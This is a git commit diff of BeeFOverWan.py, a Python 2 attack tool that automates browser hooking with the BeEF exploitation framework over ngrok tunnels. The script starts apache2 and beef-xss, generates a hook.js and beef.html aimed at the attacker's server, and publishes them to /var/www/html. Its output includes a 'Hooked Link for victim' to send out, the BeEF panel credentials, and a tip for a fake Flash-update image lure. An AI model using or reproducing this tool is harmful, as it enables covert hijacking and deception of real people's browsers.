4f27ab40a9eb5100092993a04a2d2e9489954683
root <root@localhost.localdomain>
2020-11-28 16:48:21 +0000

    ;

--- BeeFOverWan.py
+++ BeeFOverWan.py
@@ -1,87 +1,115 @@
 #!/usr/bin/python
-# -*- coding: utf8 -*-
+#-*- coding: latin1 -*-
 
-import random 
-import string
-import argparse
 import os
-from termcolor import colored
-Filename="hook.js"
+import re
+import yaml
+
+Filename = "hook.js"
+
 
 def instruction():
-	return """
+    return """
 Instructions :\n
 You need two Links  which are Forwarded To LocalHost:80 and LocalHost:3000\n
 \t1. To send to Victim .
 \t2. Beef listens on Port 3000 ,\n\t   so this link should be forwared to LocalHost:3000 .
-	
+
 Just Enter your links in the Script \nScript will do neccessary changes required to opt for your Links .
 
 """
 
+
 def ngrok():
-	return """	
-NGROK Steps :-
+    step1 = mycolor("STEP 1", 'yellow') + mycolor(" : Add these Lines To ngrok.yml [ .ngrok2/ngrok.yml ]", "blue")
+    step2 = mycolor("STEP 2", 'yellow') + mycolor(" : Now Start ngrok with :", "blue")
+    step3 = mycolor("STEP 3", 'yellow') + mycolor(" : You will See 2 different links Forwarded to", "blue")
+    step4 = mycolor("STEP 4", 'yellow') + mycolor(" : Enter these links in Script and Follow The Steps given in Script.", "blue")
+    return """
+ngrok steps:
 
-STEP 1 : Add these Lines To ngrok.yml [Location .ngrok2/ngrok.yml ]
-	
-	tunnels:
-  	first-app:
-    	addr: 80
-    	proto: http
-  	second-app:
-    	addr: 3000
-    	proto: http
-	
-STEP 2 : Now Start ngrok with : \n
-		ngrok start --all
+{}
 
-STEP 3 : You will See 2 different links Forwarded to\n 
-	Localhost:80              [ Link To be Sent to Victim ]\n
-        Localhost:3000		  [ Your Link will be Connecting to.. ] 	
-						
-STEP 4 : Enter these links in Script and Follow The Steps given in Script.
+    tunnels:
+    apache:
+        addr: 80
+        proto: http
+    beef:
+        addr: 3000
+        proto: http
 
-"""
+{} 
+    ngrok start --all
+    
+{}
+    localhost:80    [               Send this link to victim                ]
+    localhost:3000  [ Connect this to view hooked browsers (beef panel) ... ]
+    
+{}""".format(step1, step2, step3, step4)
+
 
 def banner():
-	return """
+    return """
   ____            ______    ____                  __          __     _   _ 
  |  _ \          |  ____|  / __ \                 \ \        / /\   | \ | |
  | |_) | ___  ___| |__    | |  | |_   _____ _ __   \ \  /\  / /  \  |  \| |
  |  _ < / _ \/ _ \  __|   | |  | \ \ / / _ \ '__|   \ \/  \/ / /\ \ | . ` |
  | |_) |  __/  __/ |      | |__| |\ V /  __/ |       \  /\  / ____ \| |\  |
  |____/ \___|\___|_|       \____/  \_/ \___|_|        \/  \/_/    \_\_| \_|
-                                                                           
- BY SKS  \n\n https://github.com/stormshadow07                                                                                                                          """
-def color(string, color=None):
-    attr = []
-    attr.append('1')
-    
-    if color:
-        if color.lower() == "red":
-            attr.append('31')
-        elif color.lower() == "green":
-            attr.append('32')
-        elif color.lower() == "blue":
-            attr.append('34')
-        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
 
+ BY SKS  \n\n https://github.com/stormshadow07\n"""
+
+
+def getpid(pname): return [item.split()[0] for item in os.popen('ps -A').read().splitlines() if
+                           pname.lower() in item.lower()]
+
+
+def get_beef_config():
+    beef_creds_file = '/usr/share/beef-xss/config.yaml'
+    try:
+        with open(beef_creds_file, 'r') as f:
+            return yaml.load(f, yaml.FullLoader)
+    except Exception as e:
+        print mycolor(" [-] Unable to get beef-xss credentials from {} : {}\n".format(beef_creds_file, e))
+        return {}
+
+
+def mycolor(mystr, dcolor=None):
+    attr = ['1']
+    COLORS = {
+        'red': 31,
+        'green': 32,
+        'yellow': 33,
+        'blue': 34,
+        'magenta': 35,
+        'cyan': 36
+    }
+    STARTERS = {
+        " [!]": 'red',
+        " [+]": 'green',
+        " [?]": 'yellow',
+        " [*]": 'blue'
+    }
+
+    if dcolor:
+        try:
+            attr.append(str(COLORS[dcolor.lower()]))
+            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), mystr)
+        except KeyError:
+            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), mystr)
     else:
-        if string.strip().startswith("[!]"):
-            attr.append('31')
-            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
-        elif string.strip().startswith("[+]"):
-            attr.append('32')
-            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
-        elif string.strip().startswith("[?]"):
-            attr.append('33')
-            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
-        elif string.strip().startswith("[*]"):
-            attr.append('34')
-            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
-        else:
-            return string
+        try:
+            for starter in STARTERS.keys():
+                if mystr.startswith(starter):
+                    attr.append(str(COLORS[starter]))
+                    return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), mystr)
+
+        except Exception as e:
+            return mystr
+
+    return mystr
+
+
 def string_replace(filename, old_string, new_string):
     # Safely read the input filename using 'with'
     with open(filename) as f:
@@ -92,82 +120,97 @@ def string_replace(filename, old_string, new_string):
 
     # Safely write the changed content, if found in the file
     with open(filename, 'w') as f:
-        #print 'Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals())
+        # print 'Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals())
         s = s.replace(old_string, new_string)
         f.write(s)
-	print color('[✔] File Changed...','green')
-
-
-
+        print mycolor(' [?] File Changed...', 'green')
 
 
 if __name__ == '__main__':
-	os.system("clear")
-	
-	
-	print color(instruction(),"green")
-	print color("[*] IF you want to Do this Without Port Forwarding : Use NGROK\n")
-	ng_check=raw_input(color("[?] Press '1' to see NGROK Instructions else Press '0' : "))
-	print ng_check
-	if (ng_check):
-		print color(ngrok(),"green")
-		con=raw_input(color("[?] Press Enter to Continue ..."))
-	os.system("clear")	
-	print color(" Checking Services Status Required ","blue")
-	os.system("service apache2 start")
-	os.system("beef-xss")
-	os.system("clear")
-	print color("All Good So far ... \n Close The Browser If Prompted .. ","green")
-	print color(banner(),"green")
-	send_to=raw_input(color((' [?] Enter Adress of Link [You are Sending to Victim]: ')))
-	send_to=send_to.rstrip()
-	print color((" [+] Send_To Link  : "+ send_to))
-	connect_to=raw_input(color((' [?] Enter Adress of Link [Your Link will be Connecting to..]: ')))
-	connect_to=connect_to.rstrip()
-	print color((" [+] Connect_To Link  : "+ connect_to))
-	print color('[✔] Checking directories...','green')
-	if not os.path.isdir("./temp"):
-		os.makedirs("./temp")
-		print (color("[+] Creating [./temp] directory for resulting code files","green"))
-	else:
-		os.system("rm -rf temp/*")
-		print color("Clean Succesful","green")
-	connect_to_full='http://'+connect_to+":80/hook.js"
-	connect_to_panel='http://'+connect_to+"/ui/panel"
-	send_to_full='http://'+send_to+'/beef.html'
-	#print connect_to_full
-	os.system("cp base.js ./temp/hook.js")
-	string_replace("./temp/hook.js","SKS_1",connect_to_full)
-	string_replace("./temp/hook.js","SKS_2",connect_to)
-	
-	os.system("cp beef.html ./temp/beef.html")
-	string_replace("./temp/beef.html","SKS_3",send_to)
-	os.system("cp ./temp/* /var/www/html/")
-	os.system("chmod a+rw /var/www/html/hook.js")
-	
-	print color("\n==================================== RESULT ====================================\n","blue")
-	print color("[+] Access The BeeF Control Panel Using : {}".format(connect_to_panel),"green")
-	print color("\t Username = beef\n\t Password = beef\n","blue")
-	print color("[+] Hooked Link To Send to Victim  : "+send_to_full,"green")
-	print color ('[?]\n\nNote : I know few of the Exploits does not work\n       due to Updated Browsers and stuff...\n\nTip : Change Payload or Images Address to your Connect_to Address with Port 80 \n\t Example : \n\t\t')
-	print color("\tFROM Image URL : http://0.0.0.0:3000/adobe/flash_update.png\n","red")
-	print color("\tTO Image URL : http://{}:80/adobe/flash_update.png \n".format(connect_to),"green")
-	print color ('\n Happy Hacking !!!\n Have Problem or Tip ? Contact : https://github.com/stormshadow07',"green")
+    os.system("clear")
 
-	
+    print mycolor(instruction(), "green")
+    print mycolor(" [*] IF you want to Do this Without Port Forwarding : Use ngrok\n")
 
+    ng_check = raw_input(mycolor(" [?] Press '1' to see how to set up tunnels in ngrok else Press '0' : "))
 
+    if int(ng_check):
+        print ngrok()
+        con = raw_input(mycolor(" [?] Press Enter to continue ... "))
 
+    os.system("clear")
+    print mycolor(" [*] Checking Services Status Required ", "blue")
 
+    # 0 - active; other value - inactive
+    apache2_off = os.system("systemctl is-active apache2 --quiet")
+    if not apache2_off:
+        print mycolor(" apache2 is running  ... \n Restart required ", "blue")
+        os.system("systemctl stop apache2")
 
+    if getpid('beef-xss'):
+        print mycolor(" beef-xss is running ... \n Restart required ", "blue")
+        os.system("beef-xss-stop")
 
+    os.system("systemctl start apache2")
+    os.system("beef-xss")
+    os.system("clear")
 
+    print mycolor("All Good So far ... \n Close The Browser If Prompted .. ", "green")
 
+    print mycolor(banner(), "green")
+    send_to = raw_input(mycolor(" [?] Link to victim [ <ngrok> --> localhost:80 ] : "))
+    send_to = send_to.rstrip()
+    print mycolor(" [+] Send_To Link  : " + send_to)
 
+    connect_to = raw_input(mycolor(" [?] Link of beef-xss [ <ngrok> --> localhost:3000 ] : "))
+    connect_to = connect_to.rstrip()
+    print mycolor(" [+] Connect_To Link  : " + connect_to)
 
+    print mycolor(" [?] Checking directories ... ", 'green')
 
+    if not os.path.isdir("./temp"):
+        os.makedirs("./temp")
+        print mycolor(" [+] Creating [./temp] directory for resulting code files", "green")
+    else:
+        os.system("rm -rf temp/*")
+        print mycolor(" [+] Clean Successfully: temp/*", "green")
 
+    if "http://" in connect_to:
+        connect_to = re.sub(r'^https?:\/\/', '', connect_to, flags=re.MULTILINE)
 
+    connect_to_full = "http://{}:80/hook.js".format(connect_to)
+    connect_to_panel = "http://{}/ui/panel".format(connect_to)
 
+    if "http://" in send_to:
+        send_to = re.sub(r'^https?:\/\/', '', send_to, flags=re.MULTILINE)
 
+    send_to_full = "http://{}/beef.html".format(send_to)
 
+    # print connect_to_full
+    os.system("cp base.js ./temp/hook.js")
+    string_replace("./temp/hook.js", "SKS_1", connect_to_full)
+    string_replace("./temp/hook.js", "SKS_2", connect_to)
+
+    os.system("cp beef.html ./temp/beef.html")
+    string_replace("./temp/beef.html", "SKS_3", send_to)
+    os.system("cp ./temp/* /var/www/html/")
+    os.system("chmod a+rw /var/www/html/hook.js")
+
+    print mycolor("\n ==================================== RESULT ====================================\n", "blue")
+    print mycolor(" [+] Access The BeeF Control Panel Using : {}".format(connect_to_panel), "green")
+
+    beef_config = get_beef_config()
+    if beef_config:
+        username = beef_config['beef']['credentials']['user']
+        password = beef_config['beef']['credentials']['passwd']
+    else:
+        username = "Unknown"
+        password = "Unknown"
+
+    print mycolor("\t Username = {}\n\t Password = {}\n".format(username, password), "blue")
+    print mycolor(" [+] Hooked Link for victim : {}".format(send_to_full), "green")
+    print " [?]\n\nNote : I know few of the Exploits does not work due to Updated Browsers and stuff..."
+    print "    Tip : Change Payload or Images Address to your Connect_to Address with Port 80 \n\t Example : "
+    print mycolor("\tFROM Image URL : http://0.0.0.0:3000/adobe/flash_update.png\n", "red")
+    print mycolor("\tTO Image URL : http://{}:80/adobe/flash_update.png".format(connect_to), "green")
+    print mycolor("\tHappy Hacking !!! Have Problem or Tip ? Contact : https://github.com/stormshadow07", "green")
